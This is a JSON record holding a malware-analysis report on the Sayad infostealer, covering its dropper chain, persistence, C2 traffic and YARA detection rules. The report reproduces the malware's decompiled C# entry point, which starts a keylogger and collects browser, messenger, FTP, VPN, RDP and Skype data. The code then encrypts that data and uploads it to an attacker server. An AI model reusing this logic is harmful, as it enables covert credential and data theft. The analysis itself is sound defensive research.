{
    "id": "99bb4bbc-ba62-46af-a183-1f9055d7efec",
    "created_at": "2022-10-25T16:48:13.691827Z",
    "updated_at": "2025-03-27T02:09:32.299294Z",
    "deleted_at": null,
    "sha1_hash": "591cef00735f510079e0fe4bd0067ca0150fd004",
    "title": "Sayad (Flying Kitten) Infostealer: Is This The Work Of The Iranian Ajax Security Team?",
    "authors": "Vinsula",
    "file_creation_date": "2014-12-03T17:01:59Z",
    "file_modification_date": "2014-12-03T17:01:59Z",
    "file_size": 2581826,
    "plain_text": "# Security Team?\n\nInformation stealing malware has become increasingly popular among malware authors targeting not just\n\ntypical end-users, but also specific organizations and states. We have come across an intriguing piece of\n\nmalware (dubbed Sayad) that implements multiple host data collection methods and wraps them up into a\n\nsingle .NET DLL. Sayad malware is typically distributed through phishing emails.\n\n**Introduction**\n\nThis week I got hold of a sample of “Sayad”, so I ran it through our Vinsula Execution Engine (VEE) to find\n\n[out what it does and how it works. Credit for sharing the sample of the malware goes to @MalwareChannel.](https://twitter.com/MalwareChannel)\n\nThe information this malware is able to steal and upload to a Web server controlled by the hackers is highly\n\nsensitive and would have an enormous impact on compromised individuals, businesses, and governments.\n\nSome of the tasks Sayad is designed to accomplish include:\n\nGet and send host system information, including:\n\nHost computer name\n\nInternal and external IPs\n\nLanguages installed\n\nUser name\n\nRunning processes\n\nOpen ports\n\nCapture and record keystrokes through a user mode key logger\n\nPeriodically capture information stored in the clipboard\n\nCollect and transfer user information for FTP Clients – FileZilla and WinSCP\n\nGet data account information for FileZilla FTP Server\n\nTransfer Kerio VPN client user configuration files\n\nCollect and transfer bookmarks for Chrome, Firefox, Internet Explorer, and Opera\n\nSteal browser cookies for Chrome, Firefox, Internet Explorer, and Opera\n\nCollect and transfer history for Chrome, Firefox, Internet Explorer, and Opera\n\nCapture any registered proxies\n\nGet and transfer the start URL for each installed browser\n\nCollect and transfer chat history for Skype, Yahoo Messenger, Pidgin, and GTalk\n\nSteal RDP, Putty accounts\n\nCollect VPN related account information for Proxifier and WinVPN\n\nDetermine if the currently logged on user is running as admin\n\n\n-----\n\n[(SHA2:8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12) at VirusTotal is zero.](https://www.virustotal.com/en/file/8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12/analysis/)\n\n\n-----\n\nThere are several interesting aspects of Sayad malware, and after running the malicious executable through\n\nthe Vinsula Execution Engine to analyze its behavior, I discovered that the initial executable titled\n\nWEXTRACT.exe (SHA1:1c52b749403d3f229636f07b0040eb17beba28e4) was in fact a self extracting EXE\n\nthat dropped and launched the Binder executable malware, ~8f60957b3689075fa093b047242c0255.exe\n\n(SHA1:69fd05ca3a7514ea79480d1dbb358fab391e738d). Once the Binder executable malware is launched, it\n\nchecks the .NET version installed on the machine and drops the information stealer DLL component, Sayad\n\n(aka Client) – DiagnosticsService.dll (SHA1:8521eefbf7336df5c275c3da4b61c94062fafdda).\n\nSayad has some characteristics that make it unique:\n\nSayad has been designed by someone who seems to have a .NET OOP/OOD background\n\nIt uses some non-traditional methods for native to .NET interop like exporting a manged API through\n\nthe native Export Address Table\n\nThe malware uses an oversimplified form of obfuscation for string utilizing Base64 encoding which in\n\nfact can be easily de-obfuscated\n\n[Our collegues from NCC Group’s Cyber Defence Operations published an article titled “A new Flying Kitten?”](https://www.nccgroup.com/en/blog/2014/07/a-new-flying-kitten/)\n\nwith some details around Sayad malware and its possible link to the activities of the Iranian hacking group\n\n“Ajax Security Team.”\n\n**Attack Overview**\n\nThe diagram below outlines the key elements of the attack. The malware executable is delivered by a phishing\n\nemail or the user is somehow tricked into downloading it and executing it. Once the user clicks on the\n\nmalware, it extracts the actual malware executable and launches it.\n\n\n-----\n\n**Analysis**\n\nOur first step was to run the “Sayad” binary through our Vinsula Execution Engine to find out just what it\n\ndoes. The process tree below as reported by our engine allows us to visually present the parent/child\n\nrelationship between all the processes and their command lines related to the execution for this specific\n\nmalware.\n\nexplorer.exe [Process Id: 140]\n\n**+ WEXTRACT.exe [Process Id: 3508]**\n\n\n-----\n\n**+ rundll32.exe [Process Id: 2596]**\n\nCmd line: rundll32.exe \"DiagnosticsService.dll\",78121\n\n**+ csc.exe [Process Id: 2672]**\n\n**+ cvtres.exe [Process Id: 256]**\n\n**+ csc.exe [Process Id: 3548]**\n\n**+ cvtres.exe [Process Id: 3280]**\n\nFor the sake of shortness, in this post we omit the command line details in the process tree above for the\n\ncsc.exe and cvtres.exe instances. For the same reason, we also don’t show the complete command line of the\n\nrundll32.exe. Because this is an important detail, here is how it shows up in our Vinsula malware report:\n\nrundll32.exe “C:\\Users\\[User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll”,78121\n\nSayad malware is a self-contained executable that embeds within itself all the required malicious components,\n\nmeaning that it doesn’t need to download any additional malicious content from the C2 server, which may\n\nappear suspicious.\n\nIts three core components are structured as “Russian Dolls,” i.e., one wrapped within the next in layers. Here\n\nis the list with the key components starting from the outermost one. Hashes of all investigated components\n\nare provided at the end of this post.\n\nSelf-extracting executable (WEXTRACT.exe)\n\nBinder (~8f60957b3689075fa093b047242c0255.exe)\n\nClient (DiagnosticsService.dll)\n\nFurther down, I will go into greater detail and provide more information about the behavior and static\n\nbuilding blocks of each of these components. For now, I am just aiming to capture the scope of each\n\nexecutable involved in the orchestration of the Sayad malware.\n\nAs we can see in the cascade tree above, the main malware WEXTRACT.exe is a self-extracting executable\n\nwhich extracts the Binder ~8f60957b3689075fa093b047242c0255.exe, and it then launches it. The Binder is\n\nresponsible for checking the installed .NET version and extracting the relevant .NET Client –\n\nDiagnosticsService.dll. This .NET DLL implements the data collecting logic and sends the collected data to\n\nthe C2 server. The following diagram captures a bit more of the detail of the malware workflow.\n\n\n-----\n\nThe main self-extracting binary WEXTRACT.exe drops two files in the user’s appdata temp directory as shown\n\nin the following entries from our Vinsula report. These two files are the two parts of the Binder – a .NET\n\nexecutable (~8f60957b3689075fa093b047242c0255.exe) and its configuration file\n\n(~8f60957b3689075fa093b047242c0255.exe.config). Details along with snippets from Binder’s source code\n\nare provided in the next sections.\n\n**+ WEXTRACT.exe [Process Id: 3508]**\n\nCreate[C:\\Users\\\n\n**[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe]**\n\nDelete[C:\\Users\\\n\n**[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe]**\n\n\n-----\n\n**[User]\\AppData\\Local\\Temp\\IXP000.TMP\\ 8f60957b3689075fa093b047242c0255.exe]**\n\nWrite[C:\\Users\\\n\n**[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe]**\n\nCreate[C:\\Users\\\n\n**[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config]**\n\nDelete[C:\\Users\\\n\n**[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config]**\n\nOpen[C:\\Users\\\n\n**[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config]**\n\nWrite[C:\\Users\\\n\n**[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config]**\n\nHere is the hashes of the Binder:\n\nFilename : ~8f60957b3689075fa093b047242c0255.exe\n\nMD5 : 72641dedb31280b78bf6a0f184ef29b6\n\nSHA1 : 69fd05ca3a7514ea79480d1dbb358fab391e738d\n\nThis is what the two files dropped by the self-extracting malware look like in Windows Explorer. They are\n\nstored in a temporary location C:\\Users\\[User]\\AppData\\Local\\Temp\\IXP000.TMP.\n\n\n-----\n\nAfter dropping the Binder and its configuration file, the main self-extracting binary launches the Binder\n\n(~8f60957b3689075fa093b047242c0255.exe). Similar to the process tree from our Vinsula report above, the\n\nbelow screenshot from Process Explorer shows the Binder being launched by the self-extracting binary.\n\n\n-----\n\nDiagnosticsService.dll) and its configuration disguised as a DLL file, base.dll. Below is a snippet from our\n\nVinsula report capturing the relevant event entries that show the Client and its configuration being created.\n\n**+ WEXTRACT.exe [Process Id: 3508]**\n\n**+ ~8f60957b3689075fa093b047242c0255.exe [Process Id: 2544]**\n\nCreate [C:\\Users\\[User]\\AppData\\Roaming\\Client\\base.dll]\n\nWrite [C:\\Users\\[User]\\AppData\\Roaming\\Client\\base.dll]\n\nCreate [C:\\Users\\\n\n**[User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll]**\n\nWrite [C:\\Users\\\n\n**[User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll]**\n\nThese are the hashes of the two core Client related files:\n\nFilename : DiagnosticsService.dll\n\nMD5 : 432a79f8f1402cb2622b27e26e900d55\n\nSHA1 : 8521eefbf7336df5c275c3da4b61c94062fafdda\n\nFilename : base.dll\n\nMD5 : 4a67b19c02d5cfdebcd85b7395d09881\n\nSHA1 : 082da03918039125dcf1f096a13ffa9ab6a56bde\n\nBefore digging into the details of the Client, lets have a look at the Binder’s\n\n(~8f60957b3689075fa093b047242c0255.exe) implementation. The Binder is a .NET executable whose\n\npurpose is to find out what version of .NET is currently installed, and then drop the relevant .NET Client DLL\n\naccordingly. There are two versions of the Client DLL that are stored as embedded resources in Binder’s\n\nexecutable. That makes the malware less chattier and allows it to drop the correct .NET version DLL without\n\nthe need to download it from a malicious Web location.\n\nAs shown in the above screenshot in the Binder’s main entry point the Sayad malware:\n\n\n-----\n\nmodifies the registry so that it will run at startup using rundll32.exe Windows utility to load the Client\n\n(DiagnosticsService.dll)\n\nextracts the relevant .NET Client version from the embedded resource\n\ndepending on the installed .NET version, it copies the Client (CopySayad method) to a user’s directory\n\nextract the configuration information from the end of the Binder’s image using the method\n\n**ReadExtraDataFromEndOfBuffer**\n\nstarts up the Client using the command rundll32.exe “C:\\Users\\\n\n**[User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll”,7812**\n\nThe following diagram reflects the code paths in Binder’s Main entry point as described in the section above.\n\nThe Binder ensures that the malware will survive reboots by registering the command for loading and\n\nexecuting the Client DLL (DiagnosticsService.dll) to run at startup as shown below.\n\n\n-----\n\nThe following shows the registry modification that comes as a result of the executing the code above.\n\nAnd here is the corresponding registry modification entries from Vinsula’s report. More on the details\n\nregarding the rundll32.exe command will be provided in the following sections.\n\n\n-----\n\n**+** 8f60957b3689075fa093b047242c0255.exe [Process Id: 2544]\n\nSet Key:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nName:DiagnosticsService\n\nValue:rundll32.exe \"C:\\[Path\n\nomitted]\\DiagnosticsService.dll\",78121\n\n**+ rundll32.exe [Process Id: 2596] Command: rundll32.exe**\n\n\"DiagnosticsService.dll\",78121\n\nSet Key:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nName:78121\n\nValue:rundll32.exe\n\n\"C:\\Windows\\system32\\rundll32.exe\",78121\n\nAn interesting aspect of the implementation of the Binder assembly is the way the malware authors decided to\n\nlaunch the Client by executing the command rundll32.exe “DiagnosticsService.dll”,7812 and utilizing WinExec\n\nAPI to launch the rundll32.exe process as shown below. The WinExec API has been provided only for\n\nbackward compatibility with 16-bit Windows.\n\nA quick Googling of the method names of the two methods FromUrlSafeBase64String ToUrlSafeBase64String\n\nfrom the Base64.cs file shows that the code has been copied from the following stackoverflow post “.NET MVC\n\nRouting w/ Url Encoding Problems”. The following screenshot shows the Binder project in Visual Studio.\n\n\n-----\n\nAs previously mentioned, the Binder extracts the relevant Client DLL according to the installed .NET version.\n\nThere are two copies of the Client DLL, targeting .NET2 and .NET4, both stored as embedded resources inside\n\nthe Binder file image.\n\nThe Binder is also responsible for extracting the configuration data located at the end of the Binder’s file\n\nimage and storing it in the base.dll file. The configuration data is stored as plain text and Base64 encoded data\n\n\n-----\n\nBuildId – a unique GUID that identifies the build of the malware. For this sample the GUID value is\n\n**{e5aac039-cf4a-4b1d-9507-df7001ee2637}**\n\nPublicKey – this is a RSA public key used for encrypting the collected data being uploaded to the\n\nmalicious Web site hxxp://0o0o0o0o0.com\n\nPostURL – this is a URL and it is used for uploading collected data to the malicious Web site –\n\nhxxp://0o0o0o0o0.com/soft.php\n\nResourceURL – a URL that the malware uses to download sqllite3.dll\n\nScreenShotCount – determines how many consecutive screenshots need to be taken each time\n\nScreenShotInterval – indicates how frequently the screenshots will be taken\n\nStartupScreenshot – determines whether to take a screenshot at startup time\n\nHere is a sample configuration file base.dll\n\nThe most interesting aspect of this malware is surely the Sayad Client (DiagnosticsService.dll). The malware\n\nauthors decided to implement the core data collection and transmission into a single .NET DLL. Typically,\n\nunknown .NET DLLs do not look as suspicious as a native Win32 DLL or an executable. Also, a DLL requires\n\nan executable to load it in order to execute any code implemented by the DLL. Sayad leverages rundll32.exe,\n\nwhich is a shell that allows the loading of 32-bit DLLs and the execution of exported APIs.\n\nBasically, Sayad Client is a 32-bit .NET DLL. Rundll32.exe would be able to load Sayad Client DLL, but as it is\n\na .NET managed DLL it doesn’t support exporting of native unmanaged APIs, thus Rundll32.exe cannot\n\nexecute any of the .NET/C# public methods implemented in the Sayad Client DLL.\n\nGoing back to the malware process tree we can see that Binder launches the following command, which is\n\ninstructing Windows utility rundll32.exe to load Sayad Client DiagnosticsService.dll, obtain the function\n\naddress of the native API named “78121” via GetProcAddress(), and call the function pointer of the entry\n\npoint “78121”.\n\nrundll32.exe \"C:\\Users\\\n\n[User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll\",78121\n\nMicrosoft C# compiler does not support interop via the export of unmanaged native APIs from within a\n\n\n-----\n\nAPI function titled 78121 .\n\nHow have the malware authors managed to export a native API from a C# DLL? Although not supported by\n\nMicrosoft, this is not impossible if after building the executable, the MSIL is modified to map a managed static\n\nmethod to the name of a native unmanaged API and then export the API so that it appears in the Export\n\nAddress Table of the managed PE (Portable Executable) image. In this case, a static method Main() of\n\nProgram class located in Program.cs of the Sayad Client DLL (DiagnosticsService.dll) maps to the native API\n\n“78121”. As shown below, a special declaration is applied to ensure that the caller (rundll32.exe) executes a\n\nmethod matching the required __stdcall calling convention. Here is the MSIL of the static Main() method.\n\n\n-----\n\nAnd below is the corresponding disassmebled C# version.\n\nSayad Client DLL’s main entry point initializes and starts up all data collection methods that the assembly\n\nimplements. The code below is executed by using the command rundll32.exe “C:\\Users\\\n\n**[User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll”,7812**\n\nThe malware authors left some debugging messages that indicate the different stages of the Sayad Client\n\ninitialization The code also handles and collects all uncaught exceptions thrown during the execution of the\n\n\n-----\n\nIn the next step, the client loads the configuration discussed in a previous section and then proceeds to start\n\nup all data collection components, as shown in the snippet below.\n\nprivate static void modopt(CallConvStdcall) Main()\n\n{\n\nApplication.SetUnhandledExceptionMode(\n\nUnhandledExceptionMode.CatchException);\n\nAppDomain.CurrentDomain.UnhandledException +=\n\nnew UnhandledExceptionEventHandler(\n\nProgram.TotalExceptionHandler);\n\nApplication.ThreadException +=\n\nnew ThreadExceptionEventHandler(\n\nProgram.TotalExceptionHandler);\n\ntry\n\n{\n\nbool flag3;\n\nClientExceptions = new List<ExceptionSerializeModel>();\n\n_uploadQuque = new UploadQueue();\n\nstring path = CommonPath.ClientPath() +\n\nPath.DirectorySeparatorChar + \"base.dll\";\n\nwhile (!File.Exists(path))\n\n{\n\nThread.Sleep(int.Parse(Resources.ShortSleepTime));\n\n}\n\nDebug.Write(\"Config loaded\");\n\nstring[] strArray = File.ReadAllLines(path);\n\nExecutableConfigInfo info2 = new ExecutableConfigInfo {\n\nBuildId = strArray[0].Trim(),\n\nPublicKey = strArray[1].Trim(),\n\nPostURL = strArray[2].Trim(),\n\nResourceURL = strArray[3].Trim(),\n\nscreenShotCount = strArray[4].Trim(),\n\nscreenShotInterval = strArray[5].Trim(),\n\nstartupScreenShot = strArray[6].Trim()\n\n};\n\n_configInfo = info2;\n\n\n-----\n\n{\n\nif (!string.IsNullOrEmpty(_configInfo.PostURL))\n\n{\n\nUri uri = new Uri(_configInfo.PostURL);\n\n_hostAddress = uri.OriginalString.Replace(\n\nuri.AbsolutePath, \"\");\n\n}\n\n}\n\ncatch\n\n{\n\nreturn;\n\n}\n\nCryptionKeyInfo info3 = new CryptionKeyInfo {\n\nKeySize = int.Parse(Resources.RSAKeySize),\n\nPublicKey = _configInfo.PublicKey\n\n};\n\n_keyInfo = info3;\n\nDebug.Write(\"Config parsed\");\n\nif (!string.IsNullOrEmpty(_hostAddress))\n\n{\n\nnew Wiper(new Http(), _hostAddress,\n\n_configInfo.BuildId).StartWiper();\n\nDebug.Write(string.Format(\"wiper {0}\", _hostAddress));\n\n}\n\nnew StorageUploader(new Http(), _configInfo.PostURL,\n\n_configInfo.BuildId).StartUploader();\n\nDebug.Write(\"storage uploader\");\n\nnew Updater(new Http(),\n\n_hostAddress, _configInfo.BuildId).StartUpdater();\n\nDebug.Write(\"updater\");\n\nint keyLogLimitSize = int.Parse(\n\nResources.KeyloggerLogLimitSize);\n\nnew Thread(delegate {\n\nKeyLoggerProc(new Http(), keyLogLimitSize);\n\n}).Start();\n\nDebug.Write(\"keylogger\");\n\nint screenshotCount = int Parse(\n\n\n-----\n\nint screenshotInterval int.Parse(\n\n_configInfo.screenShotInterval);\n\nnew Thread(delegate {\n\nScreenShotProc(new Http(),\n\nscreenshotInterval, screenshotCount);\n\n}).Start();\n\nDebug.Write(\"Screenshot\");\n\nDebug.Write(_configInfo.ResourceURL);\n\nif (SQLiteFinder.FindSqlite(_configInfo.ResourceURL))\n\n{\n\nDebug.Write(\"sqlite found & start collectiong data\");\n\nSerializeModel dataToSerialize = NewSerializerModel();\n\ndataToSerialize.MachineInfo =\n\nnew MachineInfo().GetMachineInfo();\n\nDebug.Write(\"Machine info collected\");\n\nList<IBrowser> list = new List<IBrowser> {\n\nnew Chrome(),\n\nnew Firefox(),\n\nnew Opera()\n\n};\n\nforeach (IBrowser browser in list)\n\n{\n\ndataToSerialize.BrowsersInfo.Add(\n\nbrowser.GetBrowserInfo());\n\n}\n\nDebug.Write(\"browser ok\");\n\nList<IMessenger> list2 = new List<IMessenger> {\n\nnew Pidgin(),\n\nnew YahooMessenger(),\n\nnew Gtalk()\n\n};\n\nforeach (IMessenger messenger in list2)\n\n{\n\ndataToSerialize.MessengersInfo.Add(\n\nmessenger.GetMessengerInfo());\n\n}\n\nDebug Write(\"messenger ok\");\n\n\n-----\n\nnew Proxifier()\n\n};\n\nforeach (IVpn vpn in list3)\n\n{\n\ndataToSerialize.VpNsInfo.Add(vpn.GetClientInfo());\n\n}\n\nDebug.Write(\"vpn ok\");\n\nList<IFtpClient> list4 = new List<IFtpClient> {\n\nnew FilezillaClient(),\n\nnew Winscp()\n\n};\n\nforeach (IFtpClient client in list4)\n\n{\n\ndataToSerialize.FtpClientsInfo.Add(\n\nclient.GetFtpClientInfo());\n\n}\n\nDebug.Write(\"ftp client ok\");\n\nList<IFtpServer> list5 = new List<IFtpServer> {\n\nnew FilezillaServer()\n\n};\n\nforeach (IFtpServer server in list5)\n\n{\n\ndataToSerialize.FtpManagementsInfo.Add(\n\nserver.GetFtpServerInfo());\n\n}\n\nDebug.Write(\"ftp server ok\");\n\nList<IRemoteClient> list6 = new List<IRemoteClient> {\n\nnew Putty(),\n\nnew RemoteDesktop()\n\n};\n\nforeach (IRemoteClient client2 in list6)\n\n{\n\ndataToSerialize.RemoteClientsInfo.Add(\n\nclient2.GetRemoteClientsInfo());\n\n}\n\nDebug.Write(\"rdp ok\");\n\nList<IFileCollector> list7 = new List<IFileCollector> {\n\n\n-----\n\n};\n\nforeach (IFileCollector collector in list7)\n\n{\n\ndataToSerialize.ExtraFiles.Add(collector.GetFile());\n\n}\n\nDebug.Write(\"kerio ok\");\n\nstring[] skypeDatabases = Skype.GetSkypeDatabases();\n\nforeach (string str2 in skypeDatabases)\n\n{\n\nstring destFileName = Path.Combine(\n\nPath.GetTempPath(), Path.GetFileName(str2));\n\nFile.Copy(str2, destFileName);\n\nif (File.Exists(destFileName))\n\n{\n\nDirectoryInfo parent = new\n\nDirectoryInfo(str2).Parent;\n\nif ((parent != null) && File.Exists(destFileName))\n\n{\n\nExtraFileSerializeModel item =\n\nnew ExtraFileSerializeModel {\n\nName = Resources.SkypePathName,\n\nDescription = parent.Name,\n\nData = File.ReadAllBytes(destFileName)\n\n};\n\ndataToSerialize.ExtraFiles.Add(item);\n\n}\n\nFile.Delete(destFileName);\n\n}\n\n}\n\nDebug.Write(\"skype ok\");\n\nbyte[] bytetoEncrypt = ModelSerializer.SerializeAndCompress(\n\ndataToSerialize);\n\nDebug.Write(\"serialize data ok\");\n\nbyte[] buffer = EncryptBuffer(bytetoEncrypt, _keyInfo);\n\nHttp http = new Http();\n\nif (!http.UploadBuffer(buffer, _configInfo.BuildId,\n\nconfigInfo PostURL))\n\n\n-----\n\nFile.WriteAllBytes(\n\nPath.Combine(CommonPath.ClientStorage(),\n\nPath.GetRandomFileName()), buffer);\n\n}\n\n}\n\nstring startupKeyName = Resources.StartupKeyName;\n\nif (!Startup.CheckStartup(startupKeyName))\n\n{\n\nStartup.SetStartup(startupKeyName,\n\nApplication.ExecutablePath);\n\n}\n\ngoto Label_07DD;\n\nLabel_07D4:\n\nThread.Sleep(-1);\n\nLabel_07DD:\n\nflag3 = true;\n\ngoto Label_07D4;\n\n}\n\ncatch (Exception exception)\n\n{\n\nAddExceptionToExceptionList(exception);\n\n}\n\n}\n\nThe Sayad Client uses a very trivial method for uploading the encrypted user and host data to the malicious\n\nserver. Here is the UploadBuffer method that uses .NET WebClient class to upload the data.\n\n\n-----\n\nBoth the Binder and the Sayad Client have been built with debugging information which reveals some details\n\nabout the source code locations for these two .NET projects.\n\nf:\\Projects\\C#\\Sayad\\Source\\Binder\\obj\\Debug\\Binder.pdb\n\nF:\\Projects\\C#\\Sayad\\Source\\Client\\bin\\x86\\Debug\\Client.pdb\n\n\n-----\n\n**Network Activity**\n\nCommunication with the C2 server is limited to transferring collected data from the user and the host to the\n\nC2 server. The stolen data being uploaded to the malicious server is encrypted first using a RSA public key\n\nwhich is stored in the malware configuration file. The Sayad Client (DiagnosticsService.dll) implements an\n\nHTTP client that uploads the encrypted data to the malicious Web server with host name\n\n“0o0o0o0o0[dot]com” and IP address 107.6.182.179. The Binder component doesn’t implement any\n\ncommunication features. The following is a short segment from Vinsula network activity report.\n\n**+ WEXTRACT.exe [Process Id: 3508]**\n\n**+ ~8f60957b3689075fa093b047242c0255.exe [Process Id: 2544]**\n\n\n-----\n\nCommand Line: rundll32.exe DiagnosticsService.dll,78121\n\n**=> TCP IPv4 UNKNOWN 192.168.64.167:1325 <==> 107.6.182.179:80**\n\n**=> TCP IPv4 UNKNOWN 192.168.64.167:1326 <==> 107.6.182.179:80**\n\n**=> TCP IPv4 send 192.168.64.167:1326 ==> 107.6.182.179:80**\n\n**=> TCP IPv4 send 192.168.64.167:1325 ==> 107.6.182.179:80**\n\n**=> TCP IPv4 recv 192.168.64.167:1326 <== 107.6.182.179:80**\n\n**=> TCP IPv4 recv 192.168.64.167:1325 <== 107.6.182.179:80**\n\n**=> TCP IPv4 UNKNOWN 192.168.64.167:1327 <==> 107.6.182.179:80**\n\n**=> TCP IPv4 send 192.168.64.167:1327 ==> 107.6.182.179:80**\n\n**=> TCP IPv4 recv 192.168.64.167:1327 <== 107.6.182.179:80**\n\n**=> TCP IPv4 UNKNOWN 192.168.64.167:1328 <==> 107.6.182.179:80**\n\n**=> TCP IPv4 UNKNOWN 192.168.64.167:1329 <==> 107.6.182.179:80**\n\n**=> TCP IPv4 send 192.168.64.167:1328 ==> 107.6.182.179:80**\n\n**=> TCP IPv4 send 192.168.64.167:1329 ==> 107.6.182.179:80**\n\n**=> TCP IPv4 recv 192.168.64.167:1328 <== 107.6.182.179:80**\n\n**=> TCP IPv4 recv 192.168.64.167:1329 <== 107.6.182.179:80**\n\n**=> TCP IPv4 UNKNOWN 192.168.64.167:1330 <==> 107.6.182.179:80**\n\n**=> TCP IPv4 UNKNOWN 192.168.64.167:1331 <==> 107.6.182.179:80**\n\n**=> TCP IPv4 send 192.168.64.167:1330 ==> 107.6.182.179:80**\n\n[According to the http://www.ipligence.com/geolocation service, the malicious Web server is located in the](http://www.ipligence.com/geolocation)\n\nNetherlands.\n\n\n-----\n\nBelow is the WHOIS information for the malicious host 0o0o0o0o0[dot]com (IP 107.6.182.179). The domain\n\nwas registered on June 30, 2014. Interestingly, the registrant, admin and tech email addresses are\n\ndomain@microsofts.com. One wonders if the registrar, OnlineNIC, Inc, is verifying whether or not these are\n\nreal email addresses.\n\n\n-----\n\n**YARA detection rule**\n\nBased on the details that have been identified, we can create two simple YARA rules for detection of the Sayad\n\nBinder and Sayad Client. Hopefully this will help other malware researchers and security companies.\n\nrule Vinsula_Sayad_Binder : infostealer\n\n**{**\n\nmeta:\n\ncopyright = \"Vinsula, Inc\"\n\ndescription = \"Sayad Infostealer Binder\"\n\nversion = \"1.0\"\n\nactor = \"Sayad Binder\"\n\nin the wild = true\n\n\n-----\n\nstrings:\n\n$pdbstr =\n\n\"\\\\Projects\\\\C#\\\\Sayad\\\\Source\\\\Binder\\\\obj\\\\Debug\\\\Binder.pdb\"\n\n$delphinativestr = \"DelphiNative.dll\" nocase\n\n$sqlite3str = \"sqlite3.dll\" nocase\n\n$winexecstr = \"WinExec\"\n\n$sayadconfig = \"base.dll\" wide\n\ncondition:\n\n**all of them**\n\n**}**\n\nrule Vinsula_Sayad_Client : infostealer\n\n**{**\n\nmeta:\n\ncopyright = \"Vinsula, Inc\"\n\ndescription = \"Sayad Infostealer Client\"\n\nversion = \"1.0\"\n\nactor = \"Sayad Client\"\n\nin_the_wild = true\n\nstrings:\n\n$pdbstr =\n\n\"\\\\Projects\\\\C#\\\\Sayad\\\\Source\\\\Client\\\\bin\\\\x86\\\\Debug\\\\Client.pdb\"\n\n$sayadconfig = \"base.dll\" wide\n\n$sqlite3str = \"sqlite3.dll\" nocase\n\n$debugstr01 = \"Config loaded\" wide\n\n$debugstr02 = \"Config parsed\" wide\n\n$debugstr03 = \"storage uploader\" wide\n\n$debugstr04 = \"updater\" wide\n\n$debugstr05 = \"keylogger\" wide\n\n$debugstr06 = \"Screenshot\" wide\n\n$debugstr07 = \"sqlite found & start collectiong data\" wide\n\n$debugstr08 = \"Machine info collected\" wide\n\n$debugstr09 = \"browser ok\" wide\n\n$debugstr10 = \"messenger ok\" wide\n\n$debugstr11 = \"vpn ok\" wide\n\n\n-----\n\n$debugstr13 ftp server ok wide\n\n$debugstr14 = \"rdp ok\" wide\n\n$debugstr15 = \"kerio ok\" wide\n\n$debugstr16 = \"skype ok\" wide\n\n$debugstr17 = \"serialize data ok\" wide\n\n$debugstr18 = \"Keylogged\" wide\n\ncondition:\n\n**all of them**\n\n**}**\n\n**Tools used for dissecting Sayad (Update 24th of July, 2014)**\n\nWe’ve received a request to list the tools used for analyzing Sayad malware. Hope that would help other\n\nresearchers.\n\nVinsula Execution Engine – Kernel mode behavioral monitoring framework for 32-bit and 64-bit\n\nWindows\n\n[http://vinsula.com/about/our-technology/](http://vinsula.com/about/our-technology/)\n\nIDA Pro – The ultimate x64/x86 disassembler and a fantastic debugger\n\n[https://www.hex-rays.com/products/ida/](https://www.hex-rays.com/products/ida/)\n\nWinDBG – Microsoft Debugging Tools for Windows – kernel and user mode debugger\n\n[http://msdn.microsoft.com/en-au/windows/hardware/hh852365.aspx](http://msdn.microsoft.com/en-au/windows/hardware/hh852365.aspx)\n\n.NET Reflector – .NET C#/MSIL decompiler and .NET debugger\n\n[http://www.red-gate.com/products/dotnet-development/reflector/](http://www.red-gate.com/products/dotnet-development/reflector/)\n\nDependency Walker – provides a tree of all dependent DLLs and APIs\n\n[http://www.dependencywalker.com/](http://www.dependencywalker.com/)\n\n\n-----\n\n[http://www.aldeid.com/wiki/PEView](http://www.aldeid.com/wiki/PEView)\n\nFiddler – free Web debugging proxy\n\n[http://www.telerik.com/fiddler](http://www.telerik.com/fiddler)\n\nSysInternals Process Explorer\n\n[http://technet.microsoft.com/en-au/sysinternals/bb896653.aspx](http://technet.microsoft.com/en-au/sysinternals/bb896653.aspx)\n\nIP Geolocator\n\n[http://www.ipligence.com/geolocation](http://www.ipligence.com/geolocation)\n\nWHOIS Search\n\n[http://www.whois.net/](http://www.whois.net/)\n\n[https://who.is/](https://who.is/)\n\nYARA – The pattern matching swiss knife for malware researchers\n\nWe use YARA to create the malware signatures\n\n[http://plusvic.readthedocs.org/en/modules/gettingstarted.html](http://plusvic.readthedocs.org/en/modules/gettingstarted.html)\n\n[http://plusvic.github.io/yara/](http://plusvic.github.io/yara/)\n\nHashmyfiles by Nir Sofer – Calculate MD5/SHA1/CRC32 hashes of files\n\n[http://www.nirsoft.net/utils/hash_my_files.html](http://www.nirsoft.net/utils/hash_my_files.html)\n\n**Summary**\n\nWith this particular sample, the malicious server – as of this writing – is up and running. The Sayad malware\n\ndoesn’t seem to be implementing any sophisticated mechanisms for collecting and transmitting the stolen\n\ndata.\n\nThe hashes of the files related to this sample are copied below.\n\n**==================================================**\n\nFilename     : WEXTRACT.exe\n\nMD5        : a7813001063a23627404887b43616386\n\nSHA1       : 1c52b749403d3f229636f07b0040eb17beba28e4\n\nSHA-256      :\n\n8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12\n\nModified Time   : 15/07/2014 6:17:44 PM\n\nCreated Time   : 17/07/2014 10:21:15 AM\n\nFile Size     : 223,744\n\nFile Version   : 11.00.9600.16428 (winblue_gdr.131013-1700)\n\nProduct Version  : 11.00.9600.16428\n\nIdentical     :\n\nExtension     : 